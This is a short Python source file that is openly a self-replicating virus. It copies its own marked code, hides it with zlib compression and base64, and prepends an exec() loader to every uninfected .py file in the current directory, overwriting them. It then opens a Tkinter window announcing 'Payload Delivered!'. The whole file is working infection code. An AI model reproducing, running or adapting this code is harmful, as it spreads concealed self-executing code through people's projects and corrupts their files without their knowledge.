# virus-start


import glob
import base64
import zlib


def find_files_to_infect(directory = "."):
  return [file for file in glob.glob("*.py")]

def obscure(data: bytes) -> bytes:
  return base64.urlsafe_b64encode(zlib.compress(data, 9))

def get_content_if_infectable(file):
  data = open(file).readlines()
  for line in data:
      if "# virus-start" in line:
          return None
  return data

def infect(file, virus_code):
  if (data:=get_content_if_infectable(file)):
    virus_code = obscure(bytes("".join(virus_code), 'utf-8'))
    viral_vector = "exec(\"import zlib\\nimport base64\\nexec(zlib.decompress(base64.urlsafe_b64decode("+str(virus_code)+")))\")"

    with open(file, "w") as infected_file:
      infected_file.write("\n# virus-start" + "\n" + viral_vector + "\n" + "# virus-end" + "\n")
      infected_file.writelines(data)

def get_virus_code():
  virus_code_on = False
  filtered_virus_code = []

  virus_code = open(__file__,'r').readlines()
  count = 0
  for line in virus_code:
    if "# virus-start" in line:
      virus_code_on = True

    if virus_code_on:
      filtered_virus_code.append(line + "\n")

    if "# virus-end" in line and 'if' not in line and 'write' not in line:
      virus_code_on = False
      break

  return filtered_virus_code




from tkinter import *

def payload():
  window = Tk()
  window.title("Hello World Hacker")

  label = Label(window, text="Payload Delivered!", font=("Arial", 16))
  label.pack(pady=50,padx=50)

  window.mainloop()



virus_code = get_virus_code() 

for file in find_files_to_infect():
  infect(file, virus_code)

payload()

# virus-end
